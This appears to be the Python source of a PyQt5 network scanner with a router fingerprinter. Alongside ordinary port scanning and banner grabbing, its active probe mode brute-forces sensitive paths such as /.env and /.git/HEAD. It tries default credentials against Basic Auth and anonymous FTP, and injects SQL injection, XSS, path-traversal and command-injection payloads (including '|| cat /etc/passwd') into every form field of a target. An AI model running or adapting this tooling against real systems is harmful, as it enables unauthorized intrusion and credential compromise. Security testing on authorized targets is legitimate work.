import socket
import concurrent.futures
from PyQt5.QtCore import QObject, pyqtSignal
from scapy.all import IP, TCP, sr1, conf
import utils

# Suppress Scapy verbosity
conf.verb = 0

class ScannerWorker(QObject):
    """
    Worker class to handle port scanning in a separate thread.
    """
    result_ready = pyqtSignal(dict)  # Emits: {'port': int, 'status': str, 'service': str, 'os': str}
    finished = pyqtSignal()
    error = pyqtSignal(str)

    def __init__(self, target_ip, start_port, end_port, scan_type="Connect", timeout=1.0, show_closed=False, active_probe=False):
        super().__init__()
        self.target_ip = target_ip
        self.start_port = start_port
        self.end_port = end_port
        self.scan_type = scan_type
        self.timeout = timeout
        self.show_closed = show_closed
        self.active_probe = active_probe
        self.is_running = True

    def run_scan(self):
        """
        Main execution method for the scanner.
        """
        try:
            ports = range(self.start_port, self.end_port + 1)
            
            # Use ThreadPoolExecutor for concurrent scanning
            # Adjust max_workers based on network limitations/preference
            # For active usage, maybe lower thread count to avoid DoS? Keeping 50 for speed.
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(self.scan_port, port): port for port in ports}
                
                for future in concurrent.futures.as_completed(futures):
                    if not self.is_running:
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    
                    try:
                        result = future.result()
                        if result:
                            self.result_ready.emit(result)
                    except Exception as e:
                        # Log or ignore individual port errors
                        pass
            
            self.finished.emit()

        except Exception as e:
            self.error.emit(str(e))
            
    def probe_service(self, port, service_name):
        """
        Actively probe service for common weaknesses.
        Returns Tuple(findings list, log string)
        """
        findings = []
        logs = []
        
        # HTTP / HTTPS Probes
        if port in [80, 443, 8080, 8443]:
             logs.append("HTTP: Starting robust probe (using requests)...")
             protocol = "https" if port in [443, 8443] else "http"
             base_url = f"{protocol}://{self.target_ip}:{port}"
             
             paths = [
                 # Common
                 "/admin", "/login", "/dashboard", "/robots.txt", "/sitemap.xml",
                 "/.env", "/config.php", "/.git/HEAD",
                 "/phpinfo.php", "/wp-login.php", "/backup.zip", "/database.sql",
                 # Routers (Tenda, TP-Link, Netgear, D-Link)
                 "/main.html", "/login.html", "/userRpm", "/wlan.asp", 
                 "/index.asp", "/home.asp", "/cgi-bin/luci",
                 "/admin/login.asp", "/setup.cgi"
             ]
             
             import requests
             from requests.auth import HTTPBasicAuth
             # Suppress SSL warnings
             from requests.packages.urllib3.exceptions import InsecureRequestWarning
             requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
             
             success_count = 0
             try:
                 # 1. Base Request to check server & Content Analysis
                 try:
                     r = requests.get(base_url, timeout=3, verify=False)
                     server_header = r.headers.get("Server", "Unknown")
                     logs.append(f"HTTP: Server is {server_header}")
                     
                     # Extract Title
                     import re
                     title_search = re.search('<title>(.*?)</title>', r.text, re.IGNORECASE)
                     if title_search:
                         title = title_search.group(1).strip()
                         logs.append(f"HTTP: Page Title: '{title}'")
                         if "Tenda" in title or "Router" in title:
                             logs.append("HTTP: Router detected (Targeting router paths...)")
                    
                     # Extract Cookies
                     if r.cookies:
                         cookie_names = [c.name for c in r.cookies]
                         logs.append(f"HTTP: Cookies found: {', '.join(cookie_names)}")

                 except requests.exceptions.Timeout:
                     logs.append("HTTP: Main connection timed out.")
                     return findings, logs
                 except requests.exceptions.ConnectionError:
                     logs.append("HTTP: Connection refused.")
                     return findings, logs

                 # 2. Brute Force Paths
                 logs.append(f"HTTP: Checking {len(paths)} sensitive paths...")
                 with requests.Session() as session:
                     for path in paths:
                        url = f"{base_url}{path}"
                        try:
                            r = session.head(url, timeout=2, verify=False)
                            if r.status_code == 200:
                                findings.append(f"Found {path} (200 OK)")
                                success_count += 1
                                # If login page found, maybe log it for brute force?
                            elif r.status_code == 401:
                                findings.append(f"Found {path} (401 Auth Req)")
                                logs.append(f"HTTP: Auth required at {path}. Brute-forcing...")
                                # Try Basic Auth
                                creds = [
                                    ('admin', 'admin'), ('admin', 'password'), 
                                    ('admin', '1234'), ('root', 'root'), 
                                    ('user', 'user'), ('admin', '')
                                ]
                                for user, pwd in creds:
                                    try:
                                        r_auth = requests.get(url, auth=HTTPBasicAuth(user, pwd), timeout=2, verify=False)
                                        if r_auth.status_code == 200:
                                            findings.append(f"[CRITICAL] Weak Auth: {user}:{pwd} at {path}")
                                            logs.append(f"HTTP: SUCCESS! Login: {user} / {pwd}")
                                            break
                                    except:
                                        pass
                                success_count += 1
                        except:
                            pass
                 
                 logs.append(f"HTTP: Probe finished. Found {success_count} interesting paths.")

                 # 3. Injection Payloads & Smart Form Attacks
                 logs.append("HTTP: Starting Smart Payload Injection...")
                 
                 # Targets for injection: Base URL + any found PHP/ASP scripts
                 injection_targets = [base_url + "/"]
                 for f in findings:
                     if "(" in f:
                         path = f.split()[1]
                         if path.endswith(".php") or path.endswith(".asp") or path.endswith(".jsp") or "?" in path:
                             injection_targets.append(base_url + path)
                 injection_targets = list(set(injection_targets))
                 
                 payloads = [
                     # ... [Payloads list - Keep checking previous list or re-define here for clarity] ...
                     # SQL Injection (Polyglots & WAF Bypass)
                     ("SQLi (Polyglot)", "admin' -- - /*%00 OR 1=1 --", ["SQL syntax", "mysql"]),
                     ("SQLi (Union Based)", "' UNION ALL SELECT NULL,version(),NULL,NULL-- ", ["MySQL", "Postgres", "MariaDB"]),
                     ("SQLi (Time-Based)", "1'; WAITFOR DELAY '0:0:5'--", []),
                     ("SQLi (Error Based)", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ", ["Duplicate entry"]),

                     # XSS (Polyglots & Obfuscated)
                     ("XSS (Polyglot)", "javascript://%250Aalert(1)//\" autofocus onfocus=alert(1) src=1 onerror=alert(1) type=image/svg+xml data:image/svg+xml,<script>alert(1)</script>", ["alert(1)"]),
                     ("XSS (Body Event)", "<body onload=alert(1)>", ["<body onload=alert(1)>"]),
                     
                     # Directory Traversal (WAF Bypass / Encoding)
                     ("LFI (Double URL)", "/..%252f..%252f..%252fetc%252fpasswd", ["root:x:0:0:"]),
                     ("LFI (Windows)", "/..\\..\\..\\..\\windows\\win.ini", ["[extensions]"]),
                     
                     # Command Injection (Advanced / OOB simulation)
                     ("RCE (Concatenation)", "|| cat /etc/passwd", ["root:x:0:0:"]),
                     ("RCE (Backticks)", "`cat /etc/passwd`", ["root:x:0:0:"]),
                     
                     # SSTI
                     ("SSTI (Smarty)", "{php}echo 49;{/php}", ["49"]),
                     ("SSTI (Mako)", "${7*7}", ["49"])
                 ]
                 
                 import re
                 with requests.Session() as session:
                     for target in injection_targets:
                         # 1. Analyze Page for Inputs (Smart Mode)
                         input_fields = []
                         try:
                             # Get Baseline
                             base_r = session.get(target, timeout=3, verify=False)
                             baseline_code = base_r.status_code
                             baseline_len = len(base_r.text)
                             
                             # Find Inputs
                             inputs = re.findall(r'<input.*?name=["\'](.*?)["\']', base_r.text, re.IGNORECASE)
                             input_fields = list(set(inputs))
                             if input_fields:
                                 logs.append(f"HTTP: Found form at {target} with inputs: {input_fields}")
                         except:
                             baseline_code = 404
                             baseline_len = 0

                         # 2. Iterate Payloads
                         for p_name, p_val, indicators in payloads:
                             
                             # Mode A: GET Parameter Injection (Fuzzing parameters)
                             # Construct Malicious URL
                             if p_name.startswith("Dir Traversal"):
                                malicious_url = target.rstrip("/") + p_val
                             else:
                                 if "?" in target:
                                     malicious_url = target + "&test=" + p_val
                                 else:
                                     malicious_url = target + "?id=" + p_val
                             
                             logs.append(f"Payload Sent (GET): {p_name} -> ...{p_val[:20]}...")
                             
                             # Mode B: POST Injection (If inputs found)
                             if input_fields:
                                 # Construct POST Data
                                 post_data = {}
                                 for field in input_fields:
                                     post_data[field] = p_val # Inject payload into ALL fields
                                 
                                 logs.append(f"Payload Sent (POST): {p_name} -> Form Fields")
                                 try:
                                     r = session.post(target, data=post_data, timeout=3, verify=False)
                                     # Analysis
                                     is_vuln = False
                                     # Check Indicators
                                     for ind in indicators:
                                         if ind in r.text:
                                             is_vuln = True
                                             break
                                     
                                     # Anomaly Checks
                                     if not is_vuln:
                                         if r.status_code == 500:
                                             findings.append(f"[WARNING] 500 Error (Possible Crash) at {target} with {p_name}")
                                             logs.append(f"[!] ANOMALY: Server crashed (500) with payload {p_name}")
                                         elif r.status_code != baseline_code and r.status_code not in [400, 401, 403, 404]:
                                              pass # Status code diff
                                     
                                     if is_vuln:
                                         findings.append(f"[CRITICAL] {p_name} (POST) at {target}")
                                         logs.append(f"[!!!] VULNERABLE: Indicator match for {p_name}")

                                 except Exception as e:
                                     pass

                             # Execute GET Request
                             try:
                                 r = session.get(malicious_url, timeout=2, verify=False)
                                 is_vuln = False
                                 for ind in indicators:
                                     if ind in r.text:
                                         is_vuln = True
                                         break
                                 
                                 if is_vuln:
                                     findings.append(f"[CRITICAL] {p_name} at {target}")
                                     logs.append(f"[!!!] VULNERABLE: Indicator match for {p_name}")
                                 else:
                                    # Anomaly Check
                                    if r.status_code == 500:
                                         logs.append(f"[!] ANOMALY: Server returned 500 Error.")
                                    else:
                                         logs.append(f"Result: Safe (Status {r.status_code})")
                             except Exception as e:
                                 logs.append(f"Result: Failed ({str(e)})")

             except Exception as e:
                 logs.append(f"HTTP: Probe Error: {str(e)}")

             except Exception as e:
                 logs.append(f"HTTP: Probe Error: {str(e)}")

        # FTP Probe
        if port == 21 or "ftp" in service_name.lower():
            logs.append("FTP: Attempting Anonymous Login...")
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(3.0)
                    s.connect((self.target_ip, port))
                    s.recv(1024) # Banner
                    s.send(b"USER anonymous\r\n")
                    resp = s.recv(1024).decode(errors='ignore')
                    if "331" in resp: # Password required
                        s.send(b"PASS anonymous\r\n")
                        resp = s.recv(1024).decode(errors='ignore')
                        if "230" in resp:
                            findings.append("Anonymous FTP Login Allowed")
                        else:
                             logs.append("FTP: Anonymous Login Failed.")
            except:
                pass
                
        # MySQL Probe (Default Root/Empty)
        if port == 3306:
             logs.append("MySQL: Checking for default credentials (Not Implemented fully)...")
             
        return findings, logs

    def scan_port(self, port):
        """
        Route to the appropriate scan method.
        """
        if not self.is_running:
            return None

        if self.scan_type == "SYN":
            status = self.scan_port_syn(port)
        else:
            status = self.scan_port_connect(port)

        if status == "Open":
            service, banner, os_guess, vulns, scan_logs = self.deep_inspection(port)
            return {
                'port': port,
                'status': status,
                'service': service, # e.g. "SSH (OpenSSH 8.2...)"
                'os': os_guess,
                'vulns': ", ".join(vulns) if vulns else "",
                'logs': scan_logs
            }
        elif self.show_closed:
             return {
                'port': port,
                'status': status,
                'service': utils.get_service_name(port),
                'os': "Unknown",
                'vulns': "",
                'logs': []
            }
        
        return None

    def scan_port_connect(self, port):
        """
        Standard TCP Connect Scan.
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                result = s.connect_ex((self.target_ip, port))
                if result == 0:
                    return "Open"
                else:
                    return "Closed"
        except:
            return "Error"

    def scan_port_syn(self, port):
        """
        TCP SYN Scan using Scapy.
        """
        try:
            # Construct SYN packet
            pkt = IP(dst=self.target_ip) / TCP(dport=port, flags="S")
            # Send and wait for response
            resp = sr1(pkt, timeout=self.timeout, verbose=0)
            
            if resp:
                if resp.haslayer(TCP):
                    flags = resp.getlayer(TCP).flags
                    if flags == 0x12: # SYN-ACK (0x12 = 010010 = SYN+ACK)
                        # Send RST to close connection politely (optional but good practice)
                        sr1(IP(dst=self.target_ip)/TCP(dport=port, flags="R"), timeout=1, verbose=0)
                        return "Open"
                    elif flags == 0x14: # RST-ACK
                        return "Closed"
            return "Filtered/Closed"
        except PermissionError:
             # This will likely be caught by the overall try/catch in run, but good to handle local
             raise PermissionError("SYN Scan requires Administrator/Root privileges.")
        except Exception as e:
            return f"Error: {e}"

    def deep_inspection(self, port):
        """
        Perform deep inspection: banner grabbing, HTTP headers, specific probes, and OS fingerprinting.
        """
        service = utils.get_service_name(port)
        banner = "Unknown"
        os_guess = "Unknown"
        extra_info = []

        # Reverse DNS (Limit to one attempt per host ideally, but fine here)
        try:
            hostname = socket.gethostbyaddr(self.target_ip)[0]
            if hostname != self.target_ip:
                extra_info.append(f"Host: {hostname}")
        except:
            pass

        # Service Specific Probes
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2.0)
                s.connect((self.target_ip, port))
                
                # HTTP/HTTPS Probe
                if port in [80, 443, 8080, 8443]:
                    request = f"HEAD / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: AntigravityScanner/1.0\r\n\r\n"
                    s.send(request.encode())
                    try:
                        response = s.recv(4096).decode('utf-8', errors='ignore')
                        # Extract Server and X-Powered-By
                        for line in response.split('\r\n'):
                            if line.lower().startswith("server:"):
                                extra_info.append(line.split(':', 1)[1].strip())
                            if line.lower().startswith("x-powered-by:"):
                                extra_info.append(line.split(':', 1)[1].strip())
                    except socket.timeout:
                        pass
                
                # SMTP Probe
                elif port in [25, 587]:
                    try:
                        # Read initial banner
                        banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                        # Send EHLO
                        s.send(b"EHLO antigravity\r\n")
                        response = s.recv(1024).decode('utf-8', errors='ignore')
                        if "250-" in response:
                            extra_info.append("ESMTP Supported")
                    except:
                        pass
                
                # Default Banner Grab
                else:
                    try:
                        # Wait briefly for unsolicited hello
                        data = s.recv(1024).decode('utf-8', errors='ignore').strip()
                        if data:
                            banner = data.split('\n')[0][:50]
                    except socket.timeout:
                        # If no hello, try sending a generic query often triggers a response
                        s.send(b"Help\r\n")
                        try:
                            data = s.recv(1024).decode('utf-8', errors='ignore').strip()
                            if data:
                                banner = data.split('\n')[0][:50]
                        except:
                            pass

        except:
            pass
        
        # Combine Info
        full_service_info = service
        
        details = []
        if banner != "Unknown":
            details.append(banner)
        details.extend(extra_info)
        
        if details:
            full_service_info += f" ({', '.join(details)})"
            
        # Check Vulnerabilities
        vulns = utils.check_vulnerability(banner)
        # Also check extra info for matches (e.g. Server headers)
        for detail in extra_info:
            vulns.extend(utils.check_vulnerability(detail))
            
        # Active Probing
        logs = []
        if self.active_probe:
            probe_results, probe_logs = self.probe_service(port, service)
            logs.extend(probe_logs)
            
            # Add Findings
            if probe_results:
                vulns.extend(["[PROBE FOUND] " + p for p in probe_results])

        # OS Fingerprinting (TTL based)
        if self.scan_type == "SYN": 
            try:
                pkt = IP(dst=self.target_ip) / TCP(dport=port, flags="S")
                resp = sr1(pkt, timeout=self.timeout, verbose=0)
                if resp and resp.haslayer(IP):
                    ttl = resp.getlayer(IP).ttl
                    os_guess = self.guess_os_from_ttl(ttl)
            except:
                pass
        
        return full_service_info, banner, os_guess, list(set(vulns)), logs
    
    def guess_os_from_ttl(self, ttl):
        """
        Basic TTL-based OS Fingerprinting.
        """
        if ttl <= 64:
            return "Linux/Unix"
        elif ttl <= 128:
            return "Windows"
        elif ttl <= 255:
            return "Solaris/Cisco"
        return "Unknown"

    def stop(self):
        """
        Signal the scanner to stop.
        """
        self.is_running = False

class RouterFingerprinter(QObject):
    finished = pyqtSignal(dict)
    log_msg = pyqtSignal(str)
    error = pyqtSignal(str)
    
    def __init__(self, target_ip):
        super().__init__()
        self.target_ip = target_ip
        
    def run(self):
        """
        Executes the router fingerprinting process.
        """
        results = {
            "Manufacturer": "Unknown",
            "OS": "Unknown",
            "Firmware Hint": "Unknown",
            "Admin Port": "Unknown",
            "TR-069": "Closed/Unknown",
            "Details": []
        }
        
        try:
            # 1. Check TR-069 (Port 7547)
            self.log_msg.emit("Checking TR-069 (Port 7547)...")
            try:
                with socket.create_connection((self.target_ip, 7547), timeout=2) as sock:
                     results["TR-069"] = "Open"
                     sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n")
                     banner = sock.recv(1024).decode(errors='ignore')
                     if banner:
                         results["Details"].append(f"TR-069 Banner: {banner[:50].strip()}")
            except:
                pass
                
            # 2. Check Admin Ports & Headers
            target_ports = [80, 443, 8080, 8443]
            import requests # Ensure requests is available
            from requests.packages.urllib3.exceptions import InsecureRequestWarning
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            
            for port in target_ports:
                self.log_msg.emit(f"Checking Port {port}...")
                protocol = "https" if port in [443, 8443] else "http"
                url = f"{protocol}://{self.target_ip}:{port}"
                try:
                    r = requests.get(url, timeout=3, verify=False)
                    results["Admin Port"] = f"{port} ({protocol.upper()})"
                    
                    # Store Headers for analysis
                    server_header = r.headers.get("Server", "")
                    metrics = {
                        "headers": str(r.headers),
                        "body": r.text,
                        "title": "",
                        "realm": r.headers.get("WWW-Authenticate", ""),
                        "cookie": str(r.cookies)
                    }
                    
                    # Get Title
                    import re
                    title_match = re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
                    if title_match:
                        metrics["title"] = title_match.group(1)
                        results["Details"].append(f"Title: {metrics['title']}")
                        
                    results["Details"].append(f"Server Header: {server_header}")

                    # 3. Match Signatures
                    for maker, sigs in utils.ROUTER_SIGNATURES.items():
                        match_score = 0
                        # Check Headers
                        if "headers" in sigs:
                            for h in sigs["headers"]:
                                if h.lower() in metrics["headers"].lower():
                                    match_score += 1
                        # Check Body
                        if "body" in sigs:
                            for b in sigs["body"]:
                                if b.lower() in metrics["body"].lower():
                                    match_score += 1
                        # Check Title
                        if "title" in sigs:
                            for t in sigs["title"]:
                                if t.lower() in metrics["title"].lower():
                                    match_score += 2
                        
                        if match_score > 0:
                            if results["Manufacturer"] == "Unknown":
                                results["Manufacturer"] = maker
                            elif maker not in results["Manufacturer"]:
                                results["Manufacturer"] += f" / {maker}"
                                
                    # 4. OS / Firmware Guess (Header based)
                    if "VxWorks" in server_header or "RomPager" in server_header:
                        results["OS"] = "VxWorks"
                    elif "Linux" in server_header or "uhttpd" in server_header:
                        results["OS"] = "Linux (Embedded)"
                    elif "GoAhead" in server_header:
                        results["OS"] = "Embedded (GoAhead WebServer)"
                    
                    # Break on first detailed success
                    break 
                    
                except:
                    continue

            # 5. TTL Analysis (Using Scapy if available)
            if results["OS"] == "Unknown":
                 try:
                     from scapy.all import IP, TCP, sr1
                     pkt = IP(dst=self.target_ip) / TCP(dport=80, flags="S")
                     resp = sr1(pkt, timeout=1, verbose=0)
                     if resp and resp.haslayer(IP):
                         ttl = resp.getlayer(IP).ttl
                         os_hint = self.guess_os_from_ttl(ttl)
                         results["OS"] += f" (TTL: {ttl} -> {os_hint})"
                 except:
                     pass

            self.finished.emit(results)
            
        except Exception as e:
            self.error.emit(str(e))
    
    def guess_os_from_ttl(self, ttl):
         if ttl <= 64:
            return "Linux/Unix"
         elif ttl <= 128:
            return "Windows"
         elif ttl <= 255:
            return "Cisco/Network Device"
         else:
            return "Unknown"
